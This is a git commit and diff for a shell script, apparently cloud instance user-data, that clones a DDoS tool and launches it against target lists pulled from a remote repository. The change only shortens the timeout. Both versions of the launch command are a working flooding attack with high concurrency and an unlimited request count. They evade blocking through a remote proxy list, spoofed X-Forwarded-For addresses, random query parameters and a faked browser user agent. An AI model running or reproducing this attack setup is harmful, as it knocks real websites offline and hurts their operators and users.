1f191864522e5ccb33195dc190886028857db7a7
nomatterz <48525503+nomatterz@users.noreply.github.com>
2022-03-03 19:00:34 +0200

    Update user_data_ddoser.sh

--- user_data_ddoser.sh
+++ user_data_ddoser.sh
@@ -11,4 +11,4 @@ ulimit -n 100000
 git clone https://github.com/taransergey/ddoser.git
 cd ddoser/
 pip3 install -r requirements.txt
-python3 ./ddoser.py --target-urls-file https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt --target-urls-file https://raw.githubusercontent.com/hem017/cytro/master/special_targets.txt --concurrency 500 --timeout 60 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --proxy-url 'http://143.244.166.15/proxy.list' --restart-period 600 --random-xff-ip
+python3 ./ddoser.py --target-urls-file https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt --target-urls-file https://raw.githubusercontent.com/hem017/cytro/master/special_targets.txt --concurrency 500 --timeout 20 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --proxy-url 'http://143.244.166.15/proxy.list' --restart-period 600 --random-xff-ip
